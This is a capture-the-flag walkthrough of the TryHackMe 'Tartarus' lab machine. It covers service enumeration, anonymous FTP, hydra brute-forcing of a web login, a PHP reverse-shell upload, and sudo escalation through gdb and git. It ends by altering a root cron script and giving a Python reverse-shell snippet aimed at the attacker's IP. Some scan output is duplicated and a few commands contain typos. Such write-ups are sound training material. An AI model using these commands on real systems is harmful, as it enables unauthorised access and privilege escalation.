# Tryhackme Room Link  

***https://tryhackme.com/room/tartaraus***  

This is an beginner box based on simple enumeration of services and basic privilege escalation techniques. Based jake
----------------------

## [Task 1] Tartarus   

User and Root Flag  
Lets launch the machine  

scan with nmap  

> **nmap -T4 -sC -sV -oN nmap/tartarus < machine ip > **  

```
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.97.206
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.97.206
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.73 seconds

| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.73 seconds

```

lets visit port 80

we can see the default apache page nothing is there  

just run the gobuster and we find  



we can see that Anonymous FTP login allowed  

we logged in with username as ‘anonymous’ and password as blank. 

ftp <machine ip>  
ls

we can find one file test.txt

lets download it  

binary  
mget test.txt  

cat test.txt  
vsftpd test file  

nothis is on the file  lets change the directory and try  

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> mget *
mget yougotgoodeyes.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
226 Transfer complete.
14 bytes received in 0.00 secs (8.4918 kB/s)
```

> **cat yougotgoodeyes.txt **  

> **/sUp3r-s3cr3t **  

looks like its a directory  
```
http://<machine ip>/sUp3r-s3cr3t
```
we get a login page  



lets run gobuster  

```
gobuster dir -u http://10.10.53.62/ -w /usr/share/wordlists/dirb/common.txt -t 25
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.53.62/
[+] Threads:        25
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/26 00:21:24 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/26 00:23:03 Finished
===============================================================

```   
 

lets check each of this  

http://<machine ip>/robots.txt  


> User-Agent: *
> Disallow : /admin-dir

I told d4rckh we should hide our things deep.


lets check the directory  

http://<machine ip>//admin-dir  

now we get  user-id file and credentials.txt file  

now we have some user id and some password   

lets bruteforce the admin portal  

> **hydra -L user.txt  -P credentials.txt 10.10.6.38  http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^&Login=Login:F=Incorrect * "**  
 

```
[STATUS] 99.00 tries/min, 99 tries in 00:01h, 1214 to do in 00:13h, 16 active
[80][http-post-form] host: 10.10.6.38   login: enox   password: P@ssword1234

```   

we get an upload box  
we can try to upload a reverse php shell


and shart our netcat listener  

> **nc -lvnp <port>**  

we get a /images folder  from the gobuster  
visit and we get /uploads   folder  
select our php file   

and we have our shell   

make it interactive shell using python  

> **python -c 'import pty;pty.spawn("/bin/bash");'**  

> **sudo -l**  
 ```
www-data@ubuntu-xenial:/$ sudo -l
Matching Defaults entries for www-data on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu-xenial:
    (thirtytwo) NOPASSWD: /var/www/gdb  
```
let's search priv esc on **https://gtfobins.github.io/**

> **sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit**  

we are now the user thirtytwo  

lets look into d4rckh  
get the user flag  


```
$ sudo -l
Matching Defaults entries for thirtytwo on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User thirtytwo may run the following commands on ubuntu-xenial:
    (d4rckh) NOPASSWD: /usr/bin/git
```

 now we have to check for git priv esc   

> **sudo -u d4rckh git -p help config**
> **!/bin/sh**  

we can upgrade our shell now 


```

ctrl +z  
echo $TERM  
export TERM=xterm-256color  
export SHELL=/bin/bash  
stty size  
stty raw -echo;fg

reset  

stty rows <no of rows> columns <no of columns >  

now we have a fully interactive shell  

now look into the crontab  

```
```
d4rckh@ubuntu-xenial:/home/d4rckh$ cat /etc/crontab
 /etc/crontab: system-wide crontab
 Unlike any other crontab you don't have to run the crontab
 command to install the new version when you edit this file
 and files in /etc/cron.d. These files also have username fields,
 that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

 m h dom mon dow user	command
*/2 *   * * *   root    python /home/d4rckh/cleanup.py
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```


lets cat out cleanup.py  
```
d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py 
 -*- coding: utf-8 -*-
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /home/cleanup/* ')
except:
	sys.exit()

```
we have the permisssion and we can change the content of the file  



add the command to this by 

> **os'system('sudo cat /root/root.txt > /tmp/new.txt') ** 
> **sudo -u d4rch python cleanup.py**  

now we have the flag  

also we can have a bind shell 

by adding the commands 
```
import socket, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<your ip>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.system("/bin/sh -i") 

```
> **nc -lvnp 4444**





 













